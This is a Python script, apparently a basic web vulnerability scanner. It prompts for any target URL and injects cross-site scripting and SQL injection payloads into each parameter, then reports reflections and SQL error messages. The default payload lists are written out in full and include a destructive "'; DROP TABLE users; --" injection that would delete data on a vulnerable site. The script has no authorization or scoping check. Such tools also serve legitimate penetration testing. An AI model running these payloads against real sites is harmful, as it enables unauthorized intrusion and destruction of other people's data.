import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

DEFAULT_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
]

DEFAULT_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR '1'='1' -- ",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
]

async def fetch(session, method, url, params=None, data=None):
    try:
        if method == "GET":
            async with session.get(url, params=params, timeout=10) as resp:
                text = await resp.text()
                status = resp.status
                return status, text
        elif method == "POST":
            async with session.post(url, data=data, timeout=10) as resp:
                text = await resp.text()
                status = resp.status
                return status, text
    except Exception as e:
        return None, str(e)

async def test_payload(session, url, method, param, payload, base_params):
    # Prepare params or data with payload in one param
    test_params = base_params.copy()
    test_params[param] = payload
    
    if method == "GET":
        test_url = url
        status, text = await fetch(session, "GET", test_url, params=test_params)
    else:  # POST
        test_url = url
        status, text = await fetch(session, "POST", test_url, data=test_params)
    
    result = None
    if text:
        # Check for XSS
        if payload in text:
            result = f"[XSS] Vulnerable param '{param}' with payload: {payload}\nURL: {test_url}"
        # Check for SQLi error patterns
        lowered = text.lower()
        if any(err in lowered for err in SQL_ERRORS):
            result = f"[SQLi] Possible vulnerability param '{param}' with payload: {payload}\nURL: {test_url}"
    return result

async def run_tests(url, method, xss_payloads, sqli_payloads):
    parsed = urlparse(url)
    base_params = parse_qs(parsed.query)
    # parse_qs returns lists for each param, convert to single values
    base_params = {k: v[0] for k,v in base_params.items()}
    
    if not base_params and method == "GET":
        print("[!] No URL parameters found to test for GET method.")
        return
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for param in base_params:
            for payload in xss_payloads:
                tasks.append(test_payload(session, url, method, param, payload, base_params))
            for payload in sqli_payloads:
                tasks.append(test_payload(session, url, method, param, payload, base_params))
        
        results = await asyncio.gather(*tasks)
        
        found_any = False
        for res in results:
            if res:
                print(res)
                print()
                found_any = True
        
        if not found_any:
            print("No obvious XSS or SQLi vulnerabilities found with provided payloads.")

def run_payload_test():
    url = input("Enter target URL (with parameters): ").strip()
    method = input("HTTP method? GET or POST (default GET): ").strip().upper() or "GET"

    print("\nEnter custom XSS payloads separated by commas (or leave blank to use default):")
    xss_input = input().strip()
    xss_payloads = [p.strip() for p in xss_input.split(",")] if xss_input else DEFAULT_XSS_PAYLOADS
    
    print("\nEnter custom SQLi payloads separated by commas (or leave blank to use default):")
    sqli_input = input().strip()
    sqli_payloads = [p.strip() for p in sqli_input.split(",")] if sqli_input else DEFAULT_SQLI_PAYLOADS
    
    print(f"\nStarting payload tests on {url} using {method} method...\n")
    
    asyncio.run(run_tests(url, method, xss_payloads, sqli_payloads))
